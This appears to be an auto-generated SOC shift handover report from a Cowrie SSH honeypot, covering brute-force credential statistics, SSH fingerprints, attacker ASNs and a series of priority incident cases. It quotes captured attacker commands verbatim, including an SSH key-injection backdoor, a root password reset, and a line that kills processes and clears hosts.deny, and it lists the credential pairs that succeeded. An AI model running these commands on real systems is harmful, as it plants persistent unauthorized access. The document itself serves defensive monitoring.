# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-10 |
| **Generated At** | 2026-05-10T06:36:50Z |
| **Shift Time** | 06:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **200** |
| Confirmed Threats | **188** |
| False Positives Filtered | **12** (6.0%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **16** |
| High Severity Cases | **23** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **177** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **158** |
| Unique Credential Pairs | **125** |
| Unique Usernames | **54** |
| Unique Passwords | **108** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 27 |
| `root` | 23 |
| `admin` | 11 |
| `345gs5662d34` | 11 |
| `test` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `123456` | 6 |
| `123` | 4 |
| `admin123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 11 |
| `azureuser` | `P@ssw0rd123` | 2 |
| `userftp` | `123` | 2 |
| `ts3server` | `Password123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin963` | `223.233.84.127` | 2026-05-10T04:14:30 |
| `root` | `3245gs5662d34` | `223.233.84.127` | 2026-05-10T04:14:32 |
| `root` | `adminit` | `223.233.84.127` | 2026-05-10T04:17:24 |
| `root` | `test2021` | `223.233.84.127` | 2026-05-10T04:20:04 |
| `root` | `admin@2020` | `223.233.84.127` | 2026-05-10T04:22:53 |
| `root` | `admin@123@` | `45.84.59.4` | 2026-05-10T04:25:34 |
| `root` | `3245gs5662d34` | `45.84.59.4` | 2026-05-10T04:25:37 |
| `root` | `nagiosadmin` | `223.233.84.127` | 2026-05-10T04:25:38 |
| `root` | `oracle2023` | `45.84.59.4` | 2026-05-10T04:32:57 |
| `root` | `teste2` | `45.84.59.4` | 2026-05-10T04:34:25 |
| `root` | `123admin123` | `182.253.79.194` | 2026-05-10T04:46:28 |
| `root` | `admin@789` | `119.92.70.82` | 2026-05-10T06:04:59 |
| `root` | `3245gs5662d34` | `119.92.70.82` | 2026-05-10T06:05:02 |
| `root` | `admin@789` | `125.22.162.46` | 2026-05-10T06:06:13 |
| `root` | `3245gs5662d34` | `125.22.162.46` | 2026-05-10T06:06:15 |
| `root` | `bitnami` | `125.22.162.46` | 2026-05-10T06:26:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **200** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 170 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 119 | 5 |
| `03a80b21afa8...` | Modern SSH client | 39 | 4 |
| `f555226df196...` | Mirai/variant | 9 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 119 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 39 | 4 | Modern SSH client |
| `f555226df196...` | libssh | 9 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:EsHitoHxdGuF"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `182.253.79.194`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.84.59.4`, `119.92.70.82`, `223.233.84.127`, `125.22.162.46`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **23** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS6057` | Administracion Nacional de Telecomunicaciones | 1 | LOW |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS17676` | SoftBank Corp. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (23)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3313a28bff0b

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:14 |
| **Last Seen** | 2026-05-10 04:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:14:30` | `cowrie.session.connect` |
| `2026-05-10 04:14:30` | `cowrie.client.version` |
| `2026-05-10 04:14:30` | `cowrie.client.kex` |
| `2026-05-10 04:14:30` | `cowrie.login.success` |
| `2026-05-10 04:14:30` | `cowrie.session.params` |
| `2026-05-10 04:14:30` | `cowrie.command.input` |
| `2026-05-10 04:14:30` | `cowrie.command.failed` |
| `2026-05-10 04:14:30` | `cowrie.log.closed` |
| `2026-05-10 04:14:30` | `cowrie.session.params` |
| `2026-05-10 04:14:30` | `cowrie.command.input` |
| `2026-05-10 04:14:30` | `cowrie.session.file_download` |
| `2026-05-10 04:14:30` | `cowrie.log.closed` |
| `2026-05-10 04:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e3212b8ae7

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:14 |
| **Last Seen** | 2026-05-10 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:14:31` | `cowrie.session.connect` |
| `2026-05-10 04:14:31` | `cowrie.client.version` |
| `2026-05-10 04:14:31` | `cowrie.client.kex` |
| `2026-05-10 04:14:32` | `cowrie.login.success` |
| `2026-05-10 04:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab31c378f8c

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:17 |
| **Last Seen** | 2026-05-10 04:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:17:24` | `cowrie.session.connect` |
| `2026-05-10 04:17:24` | `cowrie.client.version` |
| `2026-05-10 04:17:24` | `cowrie.client.kex` |
| `2026-05-10 04:17:24` | `cowrie.login.success` |
| `2026-05-10 04:17:24` | `cowrie.session.params` |
| `2026-05-10 04:17:24` | `cowrie.command.input` |
| `2026-05-10 04:17:24` | `cowrie.command.failed` |
| `2026-05-10 04:17:24` | `cowrie.log.closed` |
| `2026-05-10 04:17:24` | `cowrie.session.params` |
| `2026-05-10 04:17:24` | `cowrie.command.input` |
| `2026-05-10 04:17:24` | `cowrie.session.file_download` |
| `2026-05-10 04:17:24` | `cowrie.log.closed` |
| `2026-05-10 04:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f4b2027de18

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:17 |
| **Last Seen** | 2026-05-10 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:17:25` | `cowrie.session.connect` |
| `2026-05-10 04:17:25` | `cowrie.client.version` |
| `2026-05-10 04:17:25` | `cowrie.client.kex` |
| `2026-05-10 04:17:25` | `cowrie.login.success` |
| `2026-05-10 04:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8974e2e79909

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:20 |
| **Last Seen** | 2026-05-10 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:20:04` | `cowrie.session.connect` |
| `2026-05-10 04:20:04` | `cowrie.client.version` |
| `2026-05-10 04:20:04` | `cowrie.client.kex` |
| `2026-05-10 04:20:04` | `cowrie.login.success` |
| `2026-05-10 04:20:04` | `cowrie.session.params` |
| `2026-05-10 04:20:04` | `cowrie.command.input` |
| `2026-05-10 04:20:04` | `cowrie.command.failed` |
| `2026-05-10 04:20:04` | `cowrie.log.closed` |
| `2026-05-10 04:20:04` | `cowrie.session.params` |
| `2026-05-10 04:20:04` | `cowrie.command.input` |
| `2026-05-10 04:20:04` | `cowrie.session.file_download` |
| `2026-05-10 04:20:04` | `cowrie.log.closed` |
| `2026-05-10 04:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbe0c7277785

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:20 |
| **Last Seen** | 2026-05-10 04:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:20:05` | `cowrie.session.connect` |
| `2026-05-10 04:20:05` | `cowrie.client.version` |
| `2026-05-10 04:20:05` | `cowrie.client.kex` |
| `2026-05-10 04:20:05` | `cowrie.login.success` |
| `2026-05-10 04:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd4173297c29

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:22 |
| **Last Seen** | 2026-05-10 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:22:53` | `cowrie.session.connect` |
| `2026-05-10 04:22:53` | `cowrie.client.version` |
| `2026-05-10 04:22:53` | `cowrie.client.kex` |
| `2026-05-10 04:22:53` | `cowrie.login.success` |
| `2026-05-10 04:22:53` | `cowrie.session.params` |
| `2026-05-10 04:22:53` | `cowrie.command.input` |
| `2026-05-10 04:22:53` | `cowrie.command.failed` |
| `2026-05-10 04:22:53` | `cowrie.log.closed` |
| `2026-05-10 04:22:53` | `cowrie.session.params` |
| `2026-05-10 04:22:53` | `cowrie.command.input` |
| `2026-05-10 04:22:53` | `cowrie.session.file_download` |
| `2026-05-10 04:22:53` | `cowrie.log.closed` |
| `2026-05-10 04:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c96d53062cb

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:22 |
| **Last Seen** | 2026-05-10 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:22:54` | `cowrie.session.connect` |
| `2026-05-10 04:22:54` | `cowrie.client.version` |
| `2026-05-10 04:22:54` | `cowrie.client.kex` |
| `2026-05-10 04:22:54` | `cowrie.login.success` |
| `2026-05-10 04:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf753a5f0136

| Field | Detail |
|---|---|
| **Source IP** | `45.84.59[.]4` |
| **First Seen** | 2026-05-10 04:25 |
| **Last Seen** | 2026-05-10 04:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:25:33` | `cowrie.session.connect` |
| `2026-05-10 04:25:33` | `cowrie.client.version` |
| `2026-05-10 04:25:33` | `cowrie.client.kex` |
| `2026-05-10 04:25:34` | `cowrie.login.success` |
| `2026-05-10 04:25:34` | `cowrie.session.params` |
| `2026-05-10 04:25:34` | `cowrie.command.input` |
| `2026-05-10 04:25:34` | `cowrie.command.failed` |
| `2026-05-10 04:25:34` | `cowrie.log.closed` |
| `2026-05-10 04:25:34` | `cowrie.session.params` |
| `2026-05-10 04:25:34` | `cowrie.command.input` |
| `2026-05-10 04:25:35` | `cowrie.session.file_download` |
| `2026-05-10 04:25:35` | `cowrie.log.closed` |
| `2026-05-10 04:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.84.59[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.84.59[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a4f66118f5

| Field | Detail |
|---|---|
| **Source IP** | `45.84.59[.]4` |
| **First Seen** | 2026-05-10 04:25 |
| **Last Seen** | 2026-05-10 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:25:37` | `cowrie.session.connect` |
| `2026-05-10 04:25:37` | `cowrie.client.version` |
| `2026-05-10 04:25:37` | `cowrie.client.kex` |
| `2026-05-10 04:25:37` | `cowrie.login.success` |
| `2026-05-10 04:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.84.59[.]4` to AbuseIPDB if not already reported
- [ ] Block `45.84.59[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-209c3713836e

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:25 |
| **Last Seen** | 2026-05-10 04:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:25:38` | `cowrie.session.connect` |
| `2026-05-10 04:25:38` | `cowrie.client.version` |
| `2026-05-10 04:25:38` | `cowrie.client.kex` |
| `2026-05-10 04:25:38` | `cowrie.login.success` |
| `2026-05-10 04:25:38` | `cowrie.session.params` |
| `2026-05-10 04:25:38` | `cowrie.command.input` |
| `2026-05-10 04:25:38` | `cowrie.command.failed` |
| `2026-05-10 04:25:38` | `cowrie.log.closed` |
| `2026-05-10 04:25:38` | `cowrie.session.params` |
| `2026-05-10 04:25:38` | `cowrie.command.input` |
| `2026-05-10 04:25:38` | `cowrie.session.file_download` |
| `2026-05-10 04:25:38` | `cowrie.log.closed` |
| `2026-05-10 04:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6491a9e89e40

| Field | Detail |
|---|---|
| **Source IP** | `223.233.84[.]127` |
| **First Seen** | 2026-05-10 04:25 |
| **Last Seen** | 2026-05-10 04:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 04:25:39` | `cowrie.session.connect` |
| `2026-05-10 04:25:39` | `cowrie.client.version` |
| `2026-05-10 04:25:39` | `cowrie.client.kex` |
| `2026-05-10 04:25:39` | `cowrie.login.success` |
| `2026-05-10 04:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.84[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.233.84[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7b85145af5f

| Field | Detail |
|---|---|
| **Source IP** | `45.84.59[.]4` |
| **First Seen** | 2026-05-10 04:32 |
| **Last Seen** | 2026-05-10 04:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
